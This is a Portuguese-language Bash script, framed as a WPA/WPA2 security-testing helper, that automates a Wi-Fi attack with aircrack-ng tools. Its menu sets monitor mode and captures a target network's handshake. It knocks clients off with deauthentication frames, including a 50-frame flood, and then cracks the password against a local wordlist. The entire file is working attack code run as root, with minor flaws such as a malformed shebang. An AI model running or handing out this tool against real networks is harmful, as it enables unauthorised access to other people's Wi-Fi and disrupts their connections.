#/bin/bash
# Script para automatizar testes de segurança em redes WPA/WPA2
# 
# Data: 19/07/2016 versão 0.1-0
# Autor: Joao Lucas <joaolucas@linuxmail.org>
# Github: https://github.com/joao-lucas
# Lincença: GPLv3
#

INTERFACE=wlp2s0
INTERFACE_MON=wlp2s0mon
DATA=$(date +'%d-%m-%Y-%H-%M')
ARQ_CAP=arq_$DATA-01.cap
WORD_LIST="/home/joao_lucas/Desktop/Wordlists/wpa.list"

menu(){
	echo "##=================salvando em: $ARQ_CAP-01.cap==================##"
	echo -e " \033[1;34m 1.\033[0m Ativar modo monitoramento" 
	echo -e " \033[1;34m 2.\033[0m Scannear redes encontradas"
	echo -e " \033[1;34m 3.\033[0m Injetar pacotes"
	echo -e " \033[1;34m 4.\033[0m Fazer deauth"
        echo -e " \033[1;34m 5.\033[0m Quebrar senha"
	echo -e " \033[1;34m 99.\033[0m Sair"
	read -p "> Opção: " opt

	case $opt in
		1) modo_monitoramento ;;
		2) scannear_redes ;;
		3) injetar_pacotes ;; 
                4) deauth ;;
                5) TENTAR_quebrar_senha ;;
		99) echo "Saindo..."; airmon-ng stop $INTERFACE_MON; sleep 2; exit 0 ;; 
		*) echo "Opção invalida!"; menu ;;
esac	
}

# ATIVAR MODO MONITORAMENTO
modo_monitoramento(){
	airmon-ng start $INTERFACE
	if [ $? -eq 0 ]
	then
                echo -e "\n [\033[0;32m OK\033[0m ] Modo monitoramento ativo!"
		menu
	else

		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em ativar modo monitoramento!"
		echo "~ Verifique se a interface de rede esta correta!"
		menu
	fi
}

# SCANNEAR AS REDES ENCONTRADAS
scannear_redes(){
	airodump-ng $INTERFACE_MON
	#aireplay-ng --test $INTERFACE_MON
        echo -e "\n ~ Escolha a rede desejada!"
	echo -e "[ AVISO ] Anote os dados da rede escolhida, como ESSID, BSSID e CANAL"
        read -p "> ESSID: " ESSID
	read -p "> BSSID: " BSSID
	read -p "> CANAL: " CHANNEL 
	echo "~ Iniciando captura de pacotes na rede $ESSID"
	airodump-ng --bssid $BSSID --essid $ESSID --channel $CHANNEL --write $ARQ_CAP $INTERFACE_MON
	if [ $? -eq 0 ]
	then
                echo -e "\n [\033[0;32m OK\033[0m ] Captura de pacotes da rede $ESSID executado com sucesso!"
	        echo "[ AVISO ] Anote o mac de pelo menos um cliente"	 
                echo "~ Salvando em: $ARQ_CAP-01.cap"
		menu	
	else
                echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em capturar pacotes da rede $ESSID"
		menu
	fi
}

# FUNÇAO PARA FAZER DEAUTH
deauth(){
        read -p "> Informe o mac de um cliente: " client
        aireplay-ng --deauth 1 -a $BSSID -e $ESSID -c $client $INTERFACE_MON --ignore-negative-one 
	#echo "~ Fazendo DEAUTH"	
	if [ $? -eq 0 ]
	then
                echo -e "\n [\033[0;32m OK\033[0m ] DEAUTH realizado com sucesso!"
		menu
	else
                echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em fazer DEAUTH!"
		menu
	fi
}

# FUNÇÃO PARA INJETAR PACOTES
injetar_pacotes(){
        read -p "> Informe o mac de um cliente: " client
        aireplay-ng -0 50 -a $BSSID -c $client $INTERFACE_MON
	if [ $? -eq 0 ]
	then
                echo -e "\n [\033[0;32m OK\033[0m ] Pacotes injetados!"
		menu
	else
		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em injetar pacotes!"
		menu
	fi
}

# TENTAR QUEBRAR SENHA
TENTAR_quebrar_senha(){
        #A senha da rede que você esta tentanto quebrar deve estar na sua wordlist"
        sleep 3 
        aircrack-ng -w $WORD_LIST $ARQ_CAP
        if [ $? -eq 0 ]
        then
               echo -e "\n [\033[0;32m OK\033[0m ] Senha quebrada com sucesso!"
               sleep 3
               menu
       else
               echo -e "\n [\033[0;31m FALHA\033[0m ] A senha não se encontra em sua Wordlist"
               menu
       fi 
}

while true
do
	if [ $UID -eq 0 ]
	then
		clear
		menu
	else
		echo "~ Executar script como root!"
		sleep 3
		exit 0
	fi
done
